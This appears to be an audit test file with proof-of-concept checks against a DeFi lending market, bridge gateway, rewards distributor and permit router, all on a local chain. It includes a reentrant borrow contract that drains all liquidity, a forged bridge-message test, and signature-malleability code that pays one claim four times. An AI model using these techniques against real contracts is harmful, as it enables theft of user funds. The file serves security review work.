import assert from "node:assert/strict";
import { before, test } from "node:test";
import {
  blockDeadline,
  compileAll,
  deploy,
  ether,
  ethers,
  expectRevert,
  makeChain,
  send
} from "../../target/test/support.mjs";

const callbackSource = `
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IMarketReviewerB {
    function borrow(uint256 amount, address receiver, bytes calldata data) external;
}

contract RecursiveBorrowReviewerB {
    IMarketReviewerB public immutable market;
    uint256 private remaining;

    constructor(IMarketReviewerB market_) { market = market_; }

    function attack(uint256 amount, uint256 totalBorrows) external {
        require(totalBorrows != 0, "COUNT");
        remaining = totalBorrows - 1;
        if (totalBorrows == 1) market.borrow(amount, address(this), "");
        else market.borrow(amount, address(this), hex"01");
    }

    function onBorrow(address, uint256 amount, bytes calldata) external {
        require(msg.sender == address(market), "MARKET");
        uint256 next = remaining;
        require(next != 0, "DONE");
        remaining = next - 1;
        if (next == 1) market.borrow(amount, address(this), "");
        else market.borrow(amount, address(this), hex"01");
    }
}
`;

const secp256k1N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n;
let artifacts;

before(async () => {
  artifacts = await compileAll({
    additionalSources: {
      "review-output/checks/RecursiveBorrowReviewerB.sol": callbackSource
    }
  });
});

async function deployMarket(chain, admin) {
  const asset = await deploy(artifacts, "MockERC20", admin, ["Aster Asset", "AST", 18]);
  const stable = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
  const vault = await deploy(artifacts, "AsterVault", admin, [await asset.getAddress()]);
  const pool = await deploy(artifacts, "ReservePool", admin, [await asset.getAddress(), await stable.getAddress()]);
  const feed = await deploy(artifacts, "MockFeed", admin, [8, 100_000_000]);
  const oracle = await deploy(artifacts, "ReserveOracle", admin, [await feed.getAddress(), await pool.getAddress()]);
  const market = await deploy(artifacts, "LendingMarket", admin, [
    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(), await admin.getAddress()
  ]);
  return { asset, stable, vault, market };
}

test("C-001 boundary: repeated callbacks drain all available market liquidity", async () => {
  const chain = await makeChain();
  const [admin, attacker] = chain.signers;
  const { asset, stable, vault, market } = await deployMarket(chain, admin);
  const callback = await deploy(artifacts, "RecursiveBorrowReviewerB", attacker, [await market.getAddress()]);
  const callbackAddress = await callback.getAddress();
  const perBorrow = ether(750);
  const borrowCount = 8n;
  const availableLiquidity = perBorrow * borrowCount;

  await send(stable.mint(await market.getAddress(), availableLiquidity));
  await send(asset.mint(await attacker.getAddress(), ether(1_000)));
  await send(asset.connect(attacker).approve(await vault.getAddress(), ether(1_000)));
  await send(vault.connect(attacker).deposit(ether(1_000), await attacker.getAddress()));
  await send(vault.connect(attacker).approve(await market.getAddress(), ether(1_000)));
  await send(market.connect(attacker).depositCollateral(ether(1_000), callbackAddress));

  assert.equal(await market.borrowLimit(callbackAddress), perBorrow);
  await send(callback.connect(attacker).attack(perBorrow, borrowCount));
  assert.equal(await stable.balanceOf(await market.getAddress()), 0n);
  assert.equal(await stable.balanceOf(callbackAddress), availableLiquidity);
  assert.equal(await market.debt(callbackAddress), availableLiquidity);
  console.log(JSON.stringify({
    check: "C-001-recursion-scale",
    borrowCount: String(borrowCount),
    borrowLimit: String(perBorrow),
    marketLiquidityAfter: "0",
    attackerStable: String(await stable.balanceOf(callbackAddress)),
    debtAfter: String(await market.debt(callbackAddress))
  }));
});

test("C-002 boundary: messenger and configured-chain gates hold, but remote-sender gate is absent", async () => {
  const chain = await makeChain();
  const [admin, attacker, configuredRemote, otherRemote] = chain.signers;
  const { stable, market } = await deployMarket(chain, admin);
  const messenger = await deploy(artifacts, "MockMessenger", admin);
  const gateway = await deploy(artifacts, "BridgeGateway", admin, [
    await messenger.getAddress(), await market.getAddress(), await admin.getAddress()
  ]);
  const beneficiary = await attacker.getAddress();

  await send(gateway.configureRemote(10, await configuredRemote.getAddress()));
  await send(market.setBridge(await gateway.getAddress()));
  await send(stable.mint(await market.getAddress(), ether(1_000)));

  await expectRevert(gateway.connect(attacker).finalizeCollateral(10, 1, beneficiary, ether(100)));
  const unsupportedMessage = gateway.interface.encodeFunctionData(
    "finalizeCollateral", [11, 1, beneficiary, ether(100)]
  );
  await expectRevert(messenger.relay(
    await gateway.getAddress(), 11, await otherRemote.getAddress(), unsupportedMessage
  ));

  const configuredMessage = gateway.interface.encodeFunctionData(
    "finalizeCollateral", [10, 1, beneficiary, ether(100)]
  );
  await send(messenger.relay(
    await gateway.getAddress(), 10, await otherRemote.getAddress(), configuredMessage
  ));
  assert.equal(await market.bridgeCollateral(beneficiary), ether(100));
  console.log(JSON.stringify({
    check: "C-002-gate-boundaries",
    directCallerRejected: true,
    unconfiguredChainRejected: true,
    mismatchingRemoteAcceptedOnConfiguredChain: true,
    bridgeCredit: String(await market.bridgeCollateral(beneficiary))
  }));
});

function serializeSignature(r, s, v) {
  return ethers.hexlify(ethers.concat([r, s, ethers.toBeHex(v, 1)]));
}

test("C-004 boundary: v aliases plus high-s malleability pay one payload four times", async () => {
  const chain = await makeChain();
  const [admin, authority, claimant, relayer] = chain.signers;
  const authorityWallet = chain.wallets[1];
  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Reward", "ARW", 18]);
  const distributor = await deploy(artifacts, "RewardsDistributor", admin, [
    await token.getAddress(), await authority.getAddress()
  ]);
  const amount = ether(20);
  const account = await claimant.getAddress();
  const nonce = 99n;
  await send(token.mint(await distributor.getAddress(), ether(100)));

  const payload = await distributor.claimPayload(account, amount, nonce);
  const signed = ethers.Signature.from(await authorityWallet.signMessage(ethers.getBytes(payload)));
  const highS = ethers.toBeHex(secp256k1N - BigInt(signed.s), 32);
  const highV = signed.v === 27 ? 28 : 27;
  const variants = [
    serializeSignature(signed.r, signed.s, signed.v),
    serializeSignature(signed.r, signed.s, signed.v - 27),
    serializeSignature(signed.r, highS, highV),
    serializeSignature(signed.r, highS, highV - 27)
  ];
  assert.equal(new Set(variants.map(ethers.keccak256)).size, 4);

  for (const variant of variants) {
    await send(distributor.connect(relayer).claim(account, amount, nonce, variant));
  }
  assert.equal(await token.balanceOf(account), amount * 4n);
  console.log(JSON.stringify({
    check: "C-004-four-encodings",
    distinctRawSignatures: variants.length,
    authorizedAmount: String(amount),
    paid: String(await token.balanceOf(account))
  }));
});

test("C-010 boundary: replay on a second router requires its own token approval", async () => {
  const chain = await makeChain();
  const [admin, owner, recipient, relayer] = chain.signers;
  const ownerWallet = chain.wallets[1];
  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
  const routerA = await deploy(artifacts, "PermitRouter", admin);
  const routerB = await deploy(artifacts, "PermitRouter", admin);
  const ownerAddress = await owner.getAddress();
  const recipientAddress = await recipient.getAddress();
  const amount = ether(25);
  const deadline = await blockDeadline(chain.provider);

  await send(token.mint(ownerAddress, amount * 2n));
  await send(token.connect(owner).approve(await routerA.getAddress(), amount));
  const payload = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(
    ["bytes32", "address", "address", "uint256", "uint256", "uint256"],
    [await routerA.TRANSFER_TYPEHASH(), ownerAddress, await token.getAddress(), amount, 0, deadline]
  ));
  const signature = await ownerWallet.signMessage(ethers.getBytes(payload));
  const args = [ownerAddress, await token.getAddress(), amount, recipientAddress, deadline, signature];

  await send(routerA.connect(relayer).executeTransfer(...args));
  await expectRevert(routerB.connect(relayer).executeTransfer.staticCall(...args));
  assert.equal(await routerB.nonces(ownerAddress), 0n);
  await send(token.connect(owner).approve(await routerB.getAddress(), amount));
  await send(routerB.connect(relayer).executeTransfer(...args));
  assert.equal(await token.balanceOf(recipientAddress), amount * 2n);
  console.log(JSON.stringify({
    check: "C-010-approval-prerequisite",
    replayWithoutSecondApprovalRejected: true,
    replayAfterSecondApprovalSucceeded: true,
    received: String(await token.balanceOf(recipientAddress))
  }));
});
